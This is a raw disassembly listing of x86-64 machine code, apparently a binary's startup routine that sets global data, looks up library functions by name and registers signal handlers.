  40c2fb:	c6 05 66 e0 00 00 16 	movb   $0x16,0xe066(%rip)        # 0x41a368
  40c302:	48 c7 05 13 e0 00 00 	movq   $0x30,0xe013(%rip)        # 0x41a320
  40c309:	30 00 00 00 
  40c30d:	c6 05 14 e0 00 00 11 	movb   $0x11,0xe014(%rip)        # 0x41a328
  40c314:	48 c7 05 01 ee 00 00 	movq   $0x0,0xee01(%rip)        # 0x41b120
  40c31b:	00 00 00 00 
  40c31f:	c6 05 da ed 00 00 02 	movb   $0x2,0xedda(%rip)        # 0x41b100
  40c326:	48 c7 05 af df 00 00 	movq   $0x30,0xdfaf(%rip)        # 0x41a2e0
  40c32d:	30 00 00 00 
  40c331:	c6 05 b0 df 00 00 11 	movb   $0x11,0xdfb0(%rip)        # 0x41a2e8
  40c338:	48 c7 05 0d ee 00 00 	movq   $0x0,0xee0d(%rip)        # 0x41b150
  40c33f:	00 00 00 00 
  40c343:	c6 05 e6 ed 00 00 02 	movb   $0x2,0xede6(%rip)        # 0x41b130
  40c34a:	48 c7 05 4b df 00 00 	movq   $0x8,0xdf4b(%rip)        # 0x41a2a0
  40c351:	08 00 00 00 
  40c355:	c6 05 4c df 00 00 16 	movb   $0x16,0xdf4c(%rip)        # 0x41a2a8
  40c35c:	48 89 15 4d df 00 00 	mov    %rdx,0xdf4d(%rip)        # 0x41a2b0
  40c363:	48 8b 15 96 b0 00 00 	mov    0xb096(%rip),%rdx        # 0x417400
  40c36a:	4c 8b 0d 5f b2 00 00 	mov    0xb25f(%rip),%r9        # 0x4175d0
  40c371:	48 c7 05 04 ee 00 00 	movq   $0x0,0xee04(%rip)        # 0x41b180
  40c378:	00 00 00 00 
  40c37c:	c6 05 dd ed 00 00 02 	movb   $0x2,0xeddd(%rip)        # 0x41b160
  40c383:	48 c7 05 32 e6 00 00 	movq   $0x38,0xe632(%rip)        # 0x41a9c0
  40c38a:	38 00 00 00 
  40c38e:	48 89 15 33 df 00 00 	mov    %rdx,0xdf33(%rip)        # 0x41a2c8
  40c395:	48 8b 15 84 b2 00 00 	mov    0xb284(%rip),%rdx        # 0x417620
  40c39c:	49 c7 01 08 00 00 00 	movq   $0x8,(%r9)
  40c3a3:	41 c6 41 08 16       	movb   $0x16,0x8(%r9)
  40c3a8:	c6 05 19 e6 00 00 12 	movb   $0x12,0xe619(%rip)        # 0x41a9c8
  40c3af:	48 89 42 10          	mov    %rax,0x10(%rdx)
  40c3b3:	4c 89 42 18          	mov    %r8,0x18(%rdx)
  40c3b7:	49 89 51 10          	mov    %rdx,0x10(%r9)
  40c3bb:	48 c7 02 30 00 00 00 	movq   $0x30,(%rdx)
  40c3c2:	c6 42 08 11          	movb   $0x11,0x8(%rdx)
  40c3c6:	48 8b 15 63 b0 00 00 	mov    0xb063(%rip),%rdx        # 0x417430
  40c3cd:	48 c7 05 f8 e5 00 00 	movq   $0x0,0xe5f8(%rip)        # 0x41a9d0
  40c3d4:	00 00 00 00 
  40c3d8:	c6 05 ea e5 00 00 02 	movb   $0x2,0xe5ea(%rip)        # 0x41a9c9
  40c3df:	48 c7 05 76 e5 00 00 	movq   $0x3e88,0xe576(%rip)        # 0x41a960
  40c3e6:	88 3e 00 00 
  40c3ea:	49 89 51 28          	mov    %rdx,0x28(%r9)
  40c3ee:	48 8d 15 cb ed 00 00 	lea    0xedcb(%rip),%rdx        # 0x41b1c0
  40c3f5:	48 89 15 a4 e5 00 00 	mov    %rdx,0xe5a4(%rip)        # 0x41a9a0
  40c3fc:	48 8d 15 1d e5 00 00 	lea    0xe51d(%rip),%rdx        # 0x41a920
  40c403:	48 89 15 e6 e4 00 00 	mov    %rdx,0xe4e6(%rip)        # 0x41a8f0
  40c40a:	48 8d 15 cf e4 00 00 	lea    0xe4cf(%rip),%rdx        # 0x41a8e0
  40c411:	c6 05 50 e5 00 00 12 	movb   $0x12,0xe550(%rip)        # 0x41a968
  40c418:	48 c7 05 4d e5 00 00 	movq   $0x0,0xe54d(%rip)        # 0x41a970
  40c41f:	00 00 00 00 
  40c423:	c6 05 3f e5 00 00 01 	movb   $0x1,0xe53f(%rip)        # 0x41a969
  40c42a:	48 c7 05 eb e4 00 00 	movq   $0x8,0xe4eb(%rip)        # 0x41a920
  40c431:	08 00 00 00 
  40c435:	c6 05 ec e4 00 00 24 	movb   $0x24,0xe4ec(%rip)        # 0x41a928
  40c43c:	48 c7 05 e9 e4 00 00 	movq   $0x0,0xe4e9(%rip)        # 0x41a930
  40c443:	00 00 00 00 
  40c447:	c6 05 db e4 00 00 03 	movb   $0x3,0xe4db(%rip)        # 0x41a929
  40c44e:	48 c7 05 87 e4 00 00 	movq   $0x3e88,0xe487(%rip)        # 0x41a8e0
  40c455:	88 3e 00 00 
  40c459:	c6 05 88 e4 00 00 10 	movb   $0x10,0xe488(%rip)        # 0x41a8e8
  40c460:	c6 05 82 e4 00 00 03 	movb   $0x3,0xe482(%rip)        # 0x41a8e9
  40c467:	c6 05 82 ed 00 00 01 	movb   $0x1,0xed82(%rip)        # 0x41b1f0
  40c46e:	48 89 15 8b ed 00 00 	mov    %rdx,0xed8b(%rip)        # 0x41b200
  40c475:	48 8d 15 2c 2e 00 00 	lea    0x2e2c(%rip),%rdx        # 0x40f2a8
  40c47c:	48 89 15 85 ed 00 00 	mov    %rdx,0xed85(%rip)        # 0x41b208
  40c483:	48 8d 15 66 ed 00 00 	lea    0xed66(%rip),%rdx        # 0x41b1f0
  40c48a:	48 89 15 e7 e4 00 00 	mov    %rdx,0xe4e7(%rip)        # 0x41a978
  40c491:	48 8d 15 c8 e4 00 00 	lea    0xe4c8(%rip),%rdx        # 0x41a960
  40c498:	48 89 15 11 e4 00 00 	mov    %rdx,0xe411(%rip)        # 0x41a8b0
  40c49f:	48 8d 15 fa e3 00 00 	lea    0xe3fa(%rip),%rdx        # 0x41a8a0
  40c4a6:	48 89 15 23 ed 00 00 	mov    %rdx,0xed23(%rip)        # 0x41b1d0
  40c4ad:	48 8d 15 f8 2d 00 00 	lea    0x2df8(%rip),%rdx        # 0x40f2ac
  40c4b4:	48 89 15 1d ed 00 00 	mov    %rdx,0xed1d(%rip)        # 0x41b1d8
  40c4bb:	48 8d 15 5e ed 00 00 	lea    0xed5e(%rip),%rdx        # 0x41b220
  40c4c2:	48 89 15 df e4 00 00 	mov    %rdx,0xe4df(%rip)        # 0x41a9a8
  40c4c9:	48 8d 15 e1 2d 00 00 	lea    0x2de1(%rip),%rdx        # 0x40f2b1
  40c4d0:	48 89 15 61 ed 00 00 	mov    %rdx,0xed61(%rip)        # 0x41b238
  40c4d7:	48 8d 15 72 ed 00 00 	lea    0xed72(%rip),%rdx        # 0x41b250
  40c4de:	48 89 15 cb e4 00 00 	mov    %rdx,0xe4cb(%rip)        # 0x41a9b0
  40c4e5:	48 8d 15 94 ed 00 00 	lea    0xed94(%rip),%rdx        # 0x41b280
  40c4ec:	48 89 15 8d e3 00 00 	mov    %rdx,0xe38d(%rip)        # 0x41a880
  40c4f3:	48 8d 15 46 e3 00 00 	lea    0xe346(%rip),%rdx        # 0x41a840
  40c4fa:	48 89 15 8f ed 00 00 	mov    %rdx,0xed8f(%rip)        # 0x41b290
  40c501:	48 8d 15 ad 2d 00 00 	lea    0x2dad(%rip),%rdx        # 0x40f2b5
  40c508:	48 89 15 89 ed 00 00 	mov    %rdx,0xed89(%rip)        # 0x41b298
  40c50f:	48 8d 15 9a ed 00 00 	lea    0xed9a(%rip),%rdx        # 0x41b2b0
  40c516:	48 89 15 6b e3 00 00 	mov    %rdx,0xe36b(%rip)        # 0x41a888
  40c51d:	48 8d 15 3c e2 00 00 	lea    0xe23c(%rip),%rdx        # 0x41a760
  40c524:	48 89 15 95 ed 00 00 	mov    %rdx,0xed95(%rip)        # 0x41b2c0
  40c52b:	48 8d 15 4e e3 00 00 	lea    0xe34e(%rip),%rdx        # 0x41a880
  40c532:	48 c7 05 bb ec 00 00 	movq   $0x0,0xecbb(%rip)        # 0x41b1f8
  40c539:	00 00 00 00 
  40c53d:	48 c7 05 58 e3 00 00 	movq   $0x8,0xe358(%rip)        # 0x41a8a0
  40c544:	08 00 00 00 
  40c548:	c6 05 59 e3 00 00 15 	movb   $0x15,0xe359(%rip)        # 0x41a8a8
  40c54f:	c6 05 53 e3 00 00 03 	movb   $0x3,0xe353(%rip)        # 0x41a8a9
  40c556:	c6 05 63 ec 00 00 01 	movb   $0x1,0xec63(%rip)        # 0x41b1c0
  40c55d:	48 c7 05 60 ec 00 00 	movq   $0x0,0xec60(%rip)        # 0x41b1c8
  40c564:	00 00 00 00 
  40c568:	c6 05 b1 ec 00 00 01 	movb   $0x1,0xecb1(%rip)        # 0x41b220
  40c56f:	48 c7 05 ae ec 00 00 	movq   $0x8,0xecae(%rip)        # 0x41b228
  40c576:	08 00 00 00 
  40c57a:	4c 89 2d af ec 00 00 	mov    %r13,0xecaf(%rip)        # 0x41b230
  40c581:	48 c7 05 b4 e2 00 00 	movq   $0x8,0xe2b4(%rip)        # 0x41a840
  40c588:	08 00 00 00 
  40c58c:	c6 05 b5 e2 00 00 19 	movb   $0x19,0xe2b5(%rip)        # 0x41a848
  40c593:	48 c7 05 b2 e2 00 00 	movq   $0x0,0xe2b2(%rip)        # 0x41a850
  40c59a:	00 00 00 00 
  40c59e:	c6 05 a4 e2 00 00 03 	movb   $0x3,0xe2a4(%rip)        # 0x41a849
  40c5a5:	c6 05 d4 ec 00 00 01 	movb   $0x1,0xecd4(%rip)        # 0x41b280
  40c5ac:	48 c7 05 d1 ec 00 00 	movq   $0x10,0xecd1(%rip)        # 0x41b288
  40c5b3:	10 00 00 00 
  40c5b7:	c6 05 f2 ec 00 00 01 	movb   $0x1,0xecf2(%rip)        # 0x41b2b0
  40c5be:	48 c7 05 ef ec 00 00 	movq   $0x18,0xecef(%rip)        # 0x41b2b8
  40c5c5:	18 00 00 00 
  40c5c9:	4c 89 25 f8 ec 00 00 	mov    %r12,0xecf8(%rip)        # 0x41b2c8
  40c5d0:	48 c7 05 95 ec 00 00 	movq   $0x2,0xec95(%rip)        # 0x41b270
  40c5d7:	02 00 00 00 
  40c5db:	48 89 15 96 ec 00 00 	mov    %rdx,0xec96(%rip)        # 0x41b278
  40c5e2:	48 8d 15 b7 e3 00 00 	lea    0xe3b7(%rip),%rdx        # 0x41a9a0
  40c5e9:	48 89 15 c8 eb 00 00 	mov    %rdx,0xebc8(%rip)        # 0x41b1b8
  40c5f0:	48 8d 15 99 eb 00 00 	lea    0xeb99(%rip),%rdx        # 0x41b190
  40c5f7:	48 89 15 da e3 00 00 	mov    %rdx,0xe3da(%rip)        # 0x41a9d8
  40c5fe:	48 8d 15 bb e3 00 00 	lea    0xe3bb(%rip),%rdx        # 0x41a9c0
  40c605:	48 89 15 64 dc 00 00 	mov    %rdx,0xdc64(%rip)        # 0x41a270
  40c60c:	48 8b 15 3d af 00 00 	mov    0xaf3d(%rip),%rdx        # 0x417550
  40c613:	48 89 05 16 dc 00 00 	mov    %rax,0xdc16(%rip)        # 0x41a230
  40c61a:	48 89 05 8f db 00 00 	mov    %rax,0xdb8f(%rip)        # 0x41a1b0
  40c621:	48 8d 05 e8 ec 00 00 	lea    0xece8(%rip),%rax        # 0x41b310
  40c628:	48 89 05 89 db 00 00 	mov    %rax,0xdb89(%rip)        # 0x41a1b8
  40c62f:	48 8d 05 6a db 00 00 	lea    0xdb6a(%rip),%rax        # 0x41a1a0
  40c636:	48 89 15 4b dc 00 00 	mov    %rdx,0xdc4b(%rip)        # 0x41a288
  40c63d:	48 8d 15 9c ec 00 00 	lea    0xec9c(%rip),%rdx        # 0x41b2e0
  40c644:	48 89 15 ed db 00 00 	mov    %rdx,0xdbed(%rip)        # 0x41a238
  40c64b:	48 8d 15 ce db 00 00 	lea    0xdbce(%rip),%rdx        # 0x41a220
  40c652:	48 89 15 97 db 00 00 	mov    %rdx,0xdb97(%rip)        # 0x41a1f0
  40c659:	48 8b 15 b0 ad 00 00 	mov    0xadb0(%rip),%rdx        # 0x417410
  40c660:	c6 05 e9 eb 00 00 02 	movb   $0x2,0xebe9(%rip)        # 0x41b250
  40c667:	48 c7 05 3e eb 00 00 	movq   $0x3,0xeb3e(%rip)        # 0x41b1b0
  40c66e:	03 00 00 00 
  40c672:	c6 05 17 eb 00 00 02 	movb   $0x2,0xeb17(%rip)        # 0x41b190
  40c679:	48 89 15 88 db 00 00 	mov    %rdx,0xdb88(%rip)        # 0x41a208
  40c680:	48 c7 05 d5 db 00 00 	movq   $0x8,0xdbd5(%rip)        # 0x41a260
  40c687:	08 00 00 00 
  40c68b:	c6 05 d6 db 00 00 18 	movb   $0x18,0xdbd6(%rip)        # 0x41a268
  40c692:	c6 05 d0 db 00 00 02 	movb   $0x2,0xdbd0(%rip)        # 0x41a269
  40c699:	48 c7 05 7c db 00 00 	movq   $0x30,0xdb7c(%rip)        # 0x41a220
  40c6a0:	30 00 00 00 
  40c6a4:	c6 05 7d db 00 00 11 	movb   $0x11,0xdb7d(%rip)        # 0x41a228
  40c6ab:	48 c7 05 4a ec 00 00 	movq   $0x0,0xec4a(%rip)        # 0x41b300
  40c6b2:	00 00 00 00 
  40c6b6:	c6 05 23 ec 00 00 02 	movb   $0x2,0xec23(%rip)        # 0x41b2e0
  40c6bd:	48 c7 05 18 db 00 00 	movq   $0x8,0xdb18(%rip)        # 0x41a1e0
  40c6c4:	08 00 00 00 
  40c6c8:	c6 05 19 db 00 00 16 	movb   $0x16,0xdb19(%rip)        # 0x41a1e8
  40c6cf:	48 c7 05 c6 da 00 00 	movq   $0x30,0xdac6(%rip)        # 0x41a1a0
  40c6d6:	30 00 00 00 
  40c6da:	c6 05 c7 da 00 00 11 	movb   $0x11,0xdac7(%rip)        # 0x41a1a8
  40c6e1:	48 c7 05 44 ec 00 00 	movq   $0x0,0xec44(%rip)        # 0x41b330
  40c6e8:	00 00 00 00 
  40c6ec:	c6 05 1d ec 00 00 02 	movb   $0x2,0xec1d(%rip)        # 0x41b310
  40c6f3:	48 c7 05 62 da 00 00 	movq   $0x8,0xda62(%rip)        # 0x41a160
  40c6fa:	08 00 00 00 
  40c6fe:	c6 05 63 da 00 00 16 	movb   $0x16,0xda63(%rip)        # 0x41a168
  40c705:	48 89 05 64 da 00 00 	mov    %rax,0xda64(%rip)        # 0x41a170
  40c70c:	48 8b 05 8d ad 00 00 	mov    0xad8d(%rip),%rax        # 0x4174a0
  40c713:	48 89 0d 16 da 00 00 	mov    %rcx,0xda16(%rip)        # 0x41a130
  40c71a:	48 8d 0d bf 2f 00 00 	lea    0x2fbf(%rip),%rcx        # 0x40f6e0
  40c721:	48 c7 05 f4 d9 00 00 	movq   $0x30,0xd9f4(%rip)        # 0x41a120
  40c728:	30 00 00 00 
  40c72c:	c6 05 f5 d9 00 00 11 	movb   $0x11,0xd9f5(%rip)        # 0x41a128
  40c733:	48 89 05 4e da 00 00 	mov    %rax,0xda4e(%rip)        # 0x41a188
  40c73a:	48 8d 05 ff eb 00 00 	lea    0xebff(%rip),%rax        # 0x41b340
  40c741:	48 89 05 f0 d9 00 00 	mov    %rax,0xd9f0(%rip)        # 0x41a138
  40c748:	48 8d 05 d1 d9 00 00 	lea    0xd9d1(%rip),%rax        # 0x41a120
  40c74f:	48 89 05 9a d9 00 00 	mov    %rax,0xd99a(%rip)        # 0x41a0f0
  40c756:	48 8b 05 f3 ac 00 00 	mov    0xacf3(%rip),%rax        # 0x417450
  40c75d:	48 c7 05 f8 eb 00 00 	movq   $0x0,0xebf8(%rip)        # 0x41b360
  40c764:	00 00 00 00 
  40c768:	c6 05 d1 eb 00 00 02 	movb   $0x2,0xebd1(%rip)        # 0x41b340
  40c76f:	48 c7 05 66 d9 00 00 	movq   $0x8,0xd966(%rip)        # 0x41a0e0
  40c776:	08 00 00 00 
  40c77a:	48 89 05 87 d9 00 00 	mov    %rax,0xd987(%rip)        # 0x41a108
  40c781:	48 8d 05 18 ec 00 00 	lea    0xec18(%rip),%rax        # 0x41b3a0
  40c788:	48 89 05 a1 e0 00 00 	mov    %rax,0xe0a1(%rip)        # 0x41a830
  40c78f:	48 8d 05 ea 2f 01 00 	lea    0x12fea(%rip),%rax        # 0x41f780
  40c796:	48 89 05 13 ec 00 00 	mov    %rax,0xec13(%rip)        # 0x41b3b0
  40c79d:	48 8d 05 2c ec 00 00 	lea    0xec2c(%rip),%rax        # 0x41b3d0
  40c7a4:	48 89 05 8d e0 00 00 	mov    %rax,0xe08d(%rip)        # 0x41a838
  40c7ab:	48 8d 05 7e e0 00 00 	lea    0xe07e(%rip),%rax        # 0x41a830
  40c7b2:	48 89 05 df eb 00 00 	mov    %rax,0xebdf(%rip)        # 0x41b398
  40c7b9:	c6 05 28 d9 00 00 16 	movb   $0x16,0xd928(%rip)        # 0x41a0e8
  40c7c0:	48 c7 05 75 3d 01 00 	movq   $0x4,0x13d75(%rip)        # 0x420540
  40c7c7:	04 00 00 00 
  40c7cb:	c6 05 76 3d 01 00 2b 	movb   $0x2b,0x13d76(%rip)        # 0x420548
  40c7d2:	48 c7 05 73 3d 01 00 	movq   $0x0,0x13d73(%rip)        # 0x420550
  40c7d9:	00 00 00 00 
  40c7dd:	c6 05 65 3d 01 00 03 	movb   $0x3,0x13d65(%rip)        # 0x420549
  40c7e4:	c6 05 b5 eb 00 00 01 	movb   $0x1,0xebb5(%rip)        # 0x41b3a0
  40c7eb:	48 c7 05 b2 eb 00 00 	movq   $0x0,0xebb2(%rip)        # 0x41b3a8
  40c7f2:	00 00 00 00 
  40c7f6:	48 89 3d bb eb 00 00 	mov    %rdi,0xebbb(%rip)        # 0x41b3b8
  40c7fd:	c6 05 cc eb 00 00 01 	movb   $0x1,0xebcc(%rip)        # 0x41b3d0
  40c804:	48 c7 05 c9 eb 00 00 	movq   $0x8,0xebc9(%rip)        # 0x41b3d8
  40c80b:	08 00 00 00 
  40c80f:	48 89 1d ca eb 00 00 	mov    %rbx,0xebca(%rip)        # 0x41b3e0
  40c816:	48 89 35 cb eb 00 00 	mov    %rsi,0xebcb(%rip)        # 0x41b3e8
  40c81d:	48 c7 05 68 eb 00 00 	movq   $0x2,0xeb68(%rip)        # 0x41b390
  40c824:	02 00 00 00 
  40c828:	c6 05 41 eb 00 00 02 	movb   $0x2,0xeb41(%rip)        # 0x41b370
  40c82f:	48 c7 05 66 d8 00 00 	movq   $0x8,0xd866(%rip)        # 0x41a0a0
  40c836:	08 00 00 00 
  40c83a:	c6 05 67 d8 00 00 16 	movb   $0x16,0xd867(%rip)        # 0x41a0a8
  40c841:	4c 89 15 68 d8 00 00 	mov    %r10,0xd868(%rip)        # 0x41a0b0
  40c848:	48 8b 05 21 ac 00 00 	mov    0xac21(%rip),%rax        # 0x417470
  40c84f:	48 89 05 72 d8 00 00 	mov    %rax,0xd872(%rip)        # 0x41a0c8
  40c856:	e8 00 88 ff ff       	call   0x40505b
  40c85b:	48 85 c0             	test   %rax,%rax
  40c85e:	48 89 05 bb df 00 00 	mov    %rax,0xdfbb(%rip)        # 0x41a820
  40c865:	75 0c                	jne    0x40c873
  40c867:	48 8d 0d 52 2e 00 00 	lea    0x2e52(%rip),%rcx        # 0x40f6c0
  40c86e:	e8 90 87 ff ff       	call   0x405003
  40c873:	48 8d 15 47 2a 00 00 	lea    0x2a47(%rip),%rdx        # 0x40f2c1
  40c87a:	48 89 c1             	mov    %rax,%rcx
  40c87d:	e8 56 86 ff ff       	call   0x404ed8
  40c882:	48 8b 0d 97 df 00 00 	mov    0xdf97(%rip),%rcx        # 0x41a820
  40c889:	48 8d 15 3e 2a 00 00 	lea    0x2a3e(%rip),%rdx        # 0x40f2ce
  40c890:	48 89 05 01 d8 00 00 	mov    %rax,0xd801(%rip)        # 0x41a098
  40c897:	e8 3c 86 ff ff       	call   0x404ed8
  40c89c:	48 8b 0d 7d df 00 00 	mov    0xdf7d(%rip),%rcx        # 0x41a820
  40c8a3:	48 8d 15 31 2a 00 00 	lea    0x2a31(%rip),%rdx        # 0x40f2db
  40c8aa:	48 89 05 df d7 00 00 	mov    %rax,0xd7df(%rip)        # 0x41a090
  40c8b1:	e8 22 86 ff ff       	call   0x404ed8
  40c8b6:	48 8b 15 d3 a7 00 00 	mov    0xa7d3(%rip),%rdx        # 0x417090
  40c8bd:	48 8b 0d 5c df 00 00 	mov    0xdf5c(%rip),%rcx        # 0x41a820
  40c8c4:	48 89 02             	mov    %rax,(%rdx)
  40c8c7:	48 8d 15 21 2a 00 00 	lea    0x2a21(%rip),%rdx        # 0x40f2ef
  40c8ce:	e8 05 86 ff ff       	call   0x404ed8
  40c8d3:	48 8b 15 c6 a7 00 00 	mov    0xa7c6(%rip),%rdx        # 0x4170a0
  40c8da:	48 8b 0d 3f df 00 00 	mov    0xdf3f(%rip),%rcx        # 0x41a820
  40c8e1:	48 89 02             	mov    %rax,(%rdx)
  40c8e4:	48 8d 15 0d 2a 00 00 	lea    0x2a0d(%rip),%rdx        # 0x40f2f8
  40c8eb:	e8 e8 85 ff ff       	call   0x404ed8
  40c8f0:	48 89 05 91 d7 00 00 	mov    %rax,0xd791(%rip)        # 0x41a088
  40c8f7:	ff 15 c7 ea 02 00    	call   *0x2eac7(%rip)        # 0x43b3c4
  40c8fd:	48 8d 15 1c eb 00 00 	lea    0xeb1c(%rip),%rdx        # 0x41b420
  40c904:	89 c1                	mov    %eax,%ecx
  40c906:	89 05 cc dc 00 00    	mov    %eax,0xdccc(%rip)        # 0x41a5d8
  40c90c:	ff 15 c2 ea 02 00    	call   *0x2eac2(%rip)        # 0x43b3d4
  40c912:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
  40c917:	e8 c0 c6 ff ff       	call   0x408fdc
  40c91c:	e8 f6 61 ff ff       	call   0x402b17
  40c921:	48 8d 0d c4 74 ff ff 	lea    -0x8b3c(%rip),%rcx        # 0x403dec
  40c928:	e8 2a 6d ff ff       	call   0x403657
  40c92d:	48 8d 0d 65 74 ff ff 	lea    -0x8b9b(%rip),%rcx        # 0x403d99
  40c934:	e8 1e 6d ff ff       	call   0x403657
  40c939:	e8 6c 72 ff ff       	call   0x403baa
  40c93e:	48 8d 15 de 93 ff ff 	lea    -0x6c22(%rip),%rdx        # 0x405d23
  40c945:	b9 02 00 00 00       	mov    $0x2,%ecx
  40c94a:	e8 41 ec ff ff       	call   0x40b590
  40c94f:	48 8d 15 cd 93 ff ff 	lea    -0x6c33(%rip),%rdx        # 0x405d23
  40c956:	b9 0b 00 00 00       	mov    $0xb,%ecx
  40c95b:	e8 30 ec ff ff       	call   0x40b590
  40c960:	48 8d 15 bc 93 ff ff 	lea    -0x6c44(%rip),%rdx        # 0x405d23
  40c967:	b9 16 00 00 00       	mov    $0x16,%ecx
  40c96c:	e8 1f ec ff ff       	call   0x40b590
  40c971:	48 8d 15 ab 93 ff ff 	lea    -0x6c55(%rip),%rdx        # 0x405d23
  40c978:	b9 08 00 00 00       	mov    $0x8,%ecx
  40c97d:	e8 0e ec ff ff       	call   0x40b590
  40c982:	48 8d 15 9a 93 ff ff 	lea    -0x6c66(%rip),%rdx        # 0x405d23
  40c989:	b9 04 00 00 00       	mov    $0x4,%ecx
  40c98e:	e8 fd eb ff ff       	call   0x40b590
  40c993:	48 8b 0d 26 b0 00 00 	mov    0xb026(%rip),%rcx        # 0x4179c0
  40c99a:	ff 15 c4 e9 02 00    	call   *0x2e9c4(%rip)        # 0x43b364
  40c9a0:	48 8d 0d b9 2d 00 00 	lea    0x2db9(%rip),%rcx        # 0x40f760
  40c9a7:	e8 af 86 ff ff       	call   0x40505b
  40c9ac:	48 8d 0d 8d 2d 00 00 	lea    0x2d8d(%rip),%rcx        # 0x40f740
  40c9b3:	48 85 c0             	test   %rax,%rax
  40c9b6:	48 89 05 f3 28 01 00 	mov    %rax,0x128f3(%rip)        # 0x41f2b0
  40c9bd:	0f 84 ab fe ff ff    	je     0x40c86e
  40c9c3:	48 8d 15 45 29 00 00 	lea    0x2945(%rip),%rdx        # 0x40f30f
  40c9ca:	48 89 c1             	mov    %rax,%rcx
  40c9cd:	e8 06 85 ff ff       	call   0x404ed8
  40c9d2:	48 8d 0d 47 2d 00 00 	lea    0x2d47(%rip),%rcx        # 0x40f720
  40c9d9:	48 89 05 78 dc 00 00 	mov    %rax,0xdc78(%rip)        # 0x41a658
  40c9e0:	e8 76 86 ff ff       	call   0x40505b
  40c9e5:	48 8d 0d 14 2d 00 00 	lea    0x2d14(%rip),%rcx        # 0x40f700
  40c9ec:	48 85 c0             	test   %rax,%rax
  40c9ef:	48 89 05 b2 28 01 00 	mov    %rax,0x128b2(%rip)        # 0x41f2a8
  40c9f6:	0f 84 72 fe ff ff    	je     0x40c86e
  40c9fc:	48 8d 15 17 29 00 00 	lea    0x2917(%rip),%rdx        # 0x40f31a
  40ca03:	48 89 c1             	mov    %rax,%rcx
  40ca06:	e8 cd 84 ff ff       	call   0x404ed8
  40ca0b:	48 8b 0d 96 28 01 00 	mov    0x12896(%rip),%rcx        # 0x41f2a8
  40ca12:	48 8d 15 10 29 00 00 	lea    0x2910(%rip),%rdx        # 0x40f329
  40ca19:	48 89 05 30 dc 00 00 	mov    %rax,0xdc30(%rip)        # 0x41a650
  40ca20:	e8 b3 84 ff ff       	call   0x404ed8
  40ca25:	48 8b 0d 7c 28 01 00 	mov    0x1287c(%rip),%rcx        # 0x41f2a8
  40ca2c:	48 8d 15 00 29 00 00 	lea    0x2900(%rip),%rdx        # 0x40f333
  40ca33:	48 89 05 0e dc 00 00 	mov    %rax,0xdc0e(%rip)        # 0x41a648
  40ca3a:	e8 99 84 ff ff       	call   0x404ed8
  40ca3f:	48 8b 0d 6a 28 01 00 	mov    0x1286a(%rip),%rcx        # 0x41f2b0
  40ca46:	48 8d 15 f3 28 00 00 	lea    0x28f3(%rip),%rdx        # 0x40f340
  40ca4d:	48 89 05 ec db 00 00 	mov    %rax,0xdbec(%rip)        # 0x41a640
  40ca54:	e8 7f 84 ff ff       	call   0x404ed8
  40ca59:	48 8b 0d 50 28 01 00 	mov    0x12850(%rip),%rcx        # 0x41f2b0
  40ca60:	48 8d 15 e0 28 00 00 	lea    0x28e0(%rip),%rdx        # 0x40f347
  40ca67:	48 89 05 ca db 00 00 	mov    %rax,0xdbca(%rip)        # 0x41a638
  40ca6e:	e8 65 84 ff ff       	call   0x404ed8
  40ca73:	48 8b 0d 36 28 01 00 	mov    0x12836(%rip),%rcx        # 0x41f2b0
  40ca7a:	48 8d 15 cf 28 00 00 	lea    0x28cf(%rip),%rdx        # 0x40f350
  40ca81:	48 89 05 a8 db 00 00 	mov    %rax,0xdba8(%rip)        # 0x41a630
  40ca88:	e8 4b 84 ff ff       	call   0x404ed8
  40ca8d:	48 8b 0d 14 28 01 00 	mov    0x12814(%rip),%rcx        # 0x41f2a8
  40ca94:	48 8d 15 c1 28 00 00 	lea    0x28c1(%rip),%rdx        # 0x40f35c
  40ca9b:	48 89 05 86 db 00 00 	mov    %rax,0xdb86(%rip)        # 0x41a628
  40caa2:	e8 31 84 ff ff       	call   0x404ed8
  40caa7:	48 8b 0d fa 27 01 00 	mov    0x127fa(%rip),%rcx        # 0x41f2a8
  40caae:	48 8d 15 ba 28 00 00 	lea    0x28ba(%rip),%rdx        # 0x40f36f
  40cab5:	48 89 05 64 db 00 00 	mov    %rax,0xdb64(%rip)        # 0x41a620
  40cabc:	e8 17 84 ff ff       	call   0x404ed8
  40cac1:	48 8b 15 a8 a6 00 00 	mov    0xa6a8(%rip),%rdx        # 0x417170
  40cac8:	48 8b 0d d9 27 01 00 	mov    0x127d9(%rip),%rcx        # 0x41f2a8
  40cacf:	48 89 02             	mov    %rax,(%rdx)
  40cad2:	48 8d 15 ad 28 00 00 	lea    0x28ad(%rip),%rdx        # 0x40f386
  40cad9:	e8 fa 83 ff ff       	call   0x404ed8
  40cade:	48 8b 15 9b a6 00 00 	mov    0xa69b(%rip),%rdx        # 0x417180
  40cae5:	48 8b 0d bc 27 01 00 	mov    0x127bc(%rip),%rcx        # 0x41f2a8
  40caec:	48 89 02             	mov    %rax,(%rdx)
  40caef:	48 8d 15 a8 28 00 00 	lea    0x28a8(%rip),%rdx        # 0x40f39e
  40caf6:	e8 dd 83 ff ff       	call   0x404ed8
  40cafb:	48 8b 0d a6 27 01 00 	mov    0x127a6(%rip),%rcx        # 0x41f2a8
  40cb02:	48 8d 15 9f 28 00 00 	lea    0x289f(%rip),%rdx        # 0x40f3a8
  40cb09:	48 89 05 08 db 00 00 	mov    %rax,0xdb08(%rip)        # 0x41a618
  40cb10:	e8 c3 83 ff ff       	call   0x404ed8
  40cb15:	48 8b 0d 8c 27 01 00 	mov    0x1278c(%rip),%rcx        # 0x41f2a8
  40cb1c:	48 8d 15 98 28 00 00 	lea    0x2898(%rip),%rdx        # 0x40f3bb
  40cb23:	48 89 05 e6 da 00 00 	mov    %rax,0xdae6(%rip)        # 0x41a610
  40cb2a:	e8 a9 83 ff ff       	call   0x404ed8
  40cb2f:	48 8b 0d 72 27 01 00 	mov    0x12772(%rip),%rcx        # 0x41f2a8
  40cb36:	48 8d 15 8d 28 00 00 	lea    0x288d(%rip),%rdx        # 0x40f3ca
  40cb3d:	48 89 05 c4 da 00 00 	mov    %rax,0xdac4(%rip)        # 0x41a608
  40cb44:	e8 8f 83 ff ff       	call   0x404ed8
  40cb49:	48 8b 0d 58 27 01 00 	mov    0x12758(%rip),%rcx        # 0x41f2a8
  40cb50:	48 8d 15 81 28 00 00 	lea    0x2881(%rip),%rdx        # 0x40f3d8
  40cb57:	48 89 05 a2 da 00 00 	mov    %rax,0xdaa2(%rip)        # 0x41a600
  40cb5e:	e8 75 83 ff ff       	call   0x404ed8
